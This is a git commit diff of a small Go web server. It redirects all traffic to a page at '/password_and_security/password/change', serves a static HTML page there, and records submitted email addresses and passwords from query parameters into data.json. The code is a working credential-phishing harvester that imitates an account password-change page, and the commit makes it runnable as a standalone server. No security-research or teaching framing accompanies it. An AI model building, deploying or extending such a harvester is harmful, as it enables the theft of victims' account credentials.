b6efcaab1a2e6062c15bef9f7a26ae4b9d5f2693
Kamil <kdnuriev@gmail.com>
2025-10-20 19:34:33 +0400

    fixes

--- main.go
+++ main.go
@@ -7,16 +7,36 @@ import (
 	"os"
 )
 
-const dataFile = "data.json"
+const (
+	dataFile = "data.json"
+	urlPath  = "/password_and_security/password/change"
+)
 
 func main() {
-	http.Handle("/password_and_security/password/change", http.FileServer(http.Dir("./static")))
-	http.HandleFunc("/send_passwd", mainHandler)
+	if len(os.Args) < 2 {
+		panic(fmt.Errorf("server address must be passed as an argument"))
+	}
+	addr := os.Args[1]
+	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		http.Redirect(w, r, urlPath, http.StatusTemporaryRedirect)
+	})
+	http.HandleFunc(urlPath, htmlHandler)
+	http.HandleFunc("/send_passwd", passwordHandler)
+	if err := http.ListenAndServe(addr, nil); err != nil {
+		panic(err)
+	}
 }
 
-func mainHandler(w http.ResponseWriter, r *http.Request) {
+func htmlHandler(w http.ResponseWriter, r *http.Request) {
+	http.ServeFile(w, r, "./static/index.html")
+}
+
+func passwordHandler(w http.ResponseWriter, r *http.Request) {
 	email := r.URL.Query().Get("email")
 	password := r.URL.Query().Get("password")
+	if email == "" || password == "" {
+		http.Error(w, "email and password are not valid", http.StatusBadRequest)
+	}
 	f, err := os.OpenFile(dataFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
 	if err != nil {
 		log.Printf("Error handling request, error: %s", err.Error())
